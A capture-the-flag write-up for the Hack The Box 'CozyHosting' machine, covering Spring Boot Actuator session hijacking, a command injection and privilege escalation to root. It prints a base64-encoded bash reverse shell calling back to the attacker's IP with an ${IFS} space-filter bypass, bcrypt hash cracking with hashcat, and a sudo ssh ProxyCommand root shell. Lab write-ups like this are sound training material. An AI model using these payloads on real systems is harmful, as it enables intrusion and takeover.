---
title: "CozyHosting - Writeup"
linkTitle: "CozyHosting"
weight: 6
featured: true
platform: "HTB"
name: "CozyHosting"
os: "Linux"
difficulty: "Easy"
points: 20
release: "02 Sep 2023"
ip: "10.129.230.87"
# Drop a real avatar at static/img/htb/cozyhosting.png and uncomment:
# avatar: "/img/htb/cozyhosting.png"
tags: ["linux", "spring-boot", "actuator", "session-hijack", "command-injection", "ifs-bypass", "postgresql", "hashcat", "sudo-ssh-proxycommand", "root-shell"]
description: "Easy Linux box. A Spring Boot Actuator endpoint leaks a live session, hijacking it opens an admin panel with a command injection vulnerability. Credentials buried in the app's own JAR file lead to a database hash, and sudo ssh with ProxyCommand closes the root path."
---

{{< htb name="CozyHosting" os="Linux" difficulty="Easy" points="20" release="02 Sep 2023" ip="10.129.230.87" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# nmap 10.129.230.87 -p22,80 -sCV
```

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
```

Add the domain to `/etc/hosts`, then browse.

```
(root㉿kali)# echo "10.129.230.87 cozyhosting.htb" >> /etc/hosts
```

## Enumeration

The homepage is a hosting company landing page.

![Cozy Hosting website homepage](/img/htb/cozyhosting/01-cozyhosting-homepage.png)

Fuzz with a Spring Boot-specific wordlist since the nginx redirect hints at a Java backend.

```
(root㉿kali)# gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -q
```

```
/actuator/sessions
/actuator/mappings
/actuator/health
/actuator/beans
/admin
/login
/error
```

`/error` returns a 500 "Whitelabel Error Page", Spring Boot's default unhandled exception page, confirming the backend framework. The `/actuator/sessions` endpoint is more interesting.

```
(root㉿kali)# curl -s http://cozyhosting.htb/actuator/sessions | python3 -m json.tool
```

![/actuator/sessions returning a live session ID mapped to "kanderson"](/img/htb/cozyhosting/02-actuator-sessions-leak.png)

```json
{
  "28A0248506E39BD61FAD1B56FC822960": "kanderson"
}
```

Spring Boot's Actuator `/sessions` endpoint is exposing live HTTP sessions, including their full session IDs. The cookie `JSESSIONID=28A0248506E39BD61FAD1B56FC822960` belongs to a currently-authenticated user named `kanderson`.

## Initial Foothold

### Session Hijack

Replace the current browser `JSESSIONID` cookie with `kanderson`'s.

![Browser dev tools showing the JSESSIONID cookie being replaced with kanderson's session ID](/img/htb/cozyhosting/03-cookie-replacement.png)

Navigate to `/admin`, the admin dashboard opens immediately.

![Admin dashboard logged in as K. Anderson](/img/htb/cozyhosting/04-admin-dashboard.png)

### Command Injection

At the bottom of the admin page is a "Include host into automatic patching" form that takes a hostname and username, then runs an SSH command in the background. The username field is passed directly to the shell. Spaces are blocked, so `${IFS}` (the Internal Field Separator) substitutes for them. The reverse shell is base64-encoded to bypass further character restrictions.

```
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDkvMTIzNCAwPiYxCg=="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
```

The base64 decodes to:

```bash
bash -i >& /dev/tcp/10.10.15.249/1234 0>&1
```

![Admin dashboard with the command injection payload in the username field](/img/htb/cozyhosting/05-command-injection-payload.png)

```
(root㉿kali)# rlwrap nc -lnvp 1234
```

```
connect to [10.10.15.249] from (UNKNOWN) [10.129.230.87] 43210
app@cozyhosting:/app$
```

## Privilege Escalation

### Credentials from the JAR File

```
app@cozyhosting:/app$ ls
```

```
cloudhosting-0.0.1.jar
```

Download and extract the JAR (which is a ZIP archive) and grep for credentials.

```
(root㉿kali)# unzip -d jar_extract cloudhosting-0.0.1.jar
(root㉿kali)# grep -r "password" jar_extract/BOOT-INF/classes/ --include="*.properties"
```

```
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

### PostgreSQL Hash

```
app@cozyhosting:/app$ psql -U postgres -h 127.0.0.1 -p 5432
```

```
postgres=# \c cozyhosting
postgres=# SELECT username, password FROM users;
```

```
 username  | password
-----------+------------------------------------------------------------------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEILOAtm1iGrzam51W.05zR42TMCBo7gvWm6
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

```
(root㉿kali)# hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt
```

```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

### Lateral Movement to `josh`

```
app@cozyhosting:/app$ su josh
Password: manchesterunited
```

```
josh@cozyhosting:~$ cat user.txt
```

### Root via `sudo ssh` ProxyCommand

```
josh@cozyhosting:~$ sudo -l
```

```
(root) /usr/bin/ssh *
```

`ssh` with no restrictions on arguments. GTFOBins documents the `ProxyCommand` escape for exactly this case.

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

```
# whoami
root
# cat /root/root.txt
```

## Lessons learned

- Spring Boot Actuator's `/sessions` endpoint has no auth by default and exposes live session IDs. Cookies marked `HttpOnly` protect against JavaScript theft, but they don't protect against network-level extraction from a monitoring endpoint that deliberately lists them.
- JARs are ZIP archives. An application's own deployment artifact frequently contains plaintext credentials in bundled config files that were never meant to be read after deployment.
- `sudo` on a binary that accepts arbitrary option flags is not limited to the binary's primary function. Know which whitelisted binaries accept options like `ProxyCommand` or similar command-execution hooks before assuming sudo access is narrow.
